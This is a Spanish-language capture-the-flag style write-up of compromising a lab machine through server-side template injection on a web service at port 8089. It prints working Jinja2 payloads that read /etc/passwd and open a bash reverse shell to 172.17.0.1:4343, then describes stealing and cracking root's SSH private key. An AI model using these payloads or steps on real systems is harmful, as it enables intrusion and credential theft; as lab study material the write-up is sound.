
Lo primero es hacer un escaneo de puertos y servicios con nmap.
![[Pasted image 20240811202559.png]]
Haciendo fuzzing web con gobuster no encuentro nada.
![[Pasted image 20240811203136.png]]
Accedo al servicio web pero por el puerto 80 solo me muestra el index por defecto de apache, sin embargo si entro por el puerto 8089 me muestra lo siguiente.
![[Pasted image 20240811203246.png]]
Si doy al Enter, veo lo siguiente.
![[Pasted image 20240811203548.png]]
Voy a probar a ver si es posible que la web sea vulnerable a SSTI(Server Site Template Injection).
![[Pasted image 20240811203657.png]]
![[Pasted image 20240811203706.png]]
Puedo inyectar código html, por lo que con la etiqueta script puedo ejecutar código javascript.
con el siguiente comando voy a poder obtener el contenido del archivo /etc/passwd para obtener los usuarios del sistema.
Si busco en el navegador información para poder atacar esta vulnerabilidad encuentro diferentes formas de explotar la vulnerabilidad en la web de [HackTrics](https://book.hacktricks.xyz/v/es/pentesting-web/ssti-server-side-template-injection) como el siguiente comando.
```javascript
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
```
![[Pasted image 20240811204408.png]]
Voy a intentar recibir una reverse shell introduciendo el siguiente comando.
```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/4343 0>&1\'').read() }}
```
![[Pasted image 20240811210104.png]]
Ahora toca intentar escalar privilegios.
Con ayuda del siguiente binario, puedo obtener la clave privada de ssh de root y utilizarla para conectarme a través del protocolo ssh como root a la máquina.
![[Pasted image 20240811210928.png]]
Copio el contenido en un archivo que creo llamado id_rsa, y con john the ripper puedo crackear el contenido.
![[Pasted image 20240811212229.png]]
Ahora ya solo falta iniciar sesión como root a través del protocolo ssh pero utilizando el archivo id_rsa con el parámetro -i y como contraseña honda1.
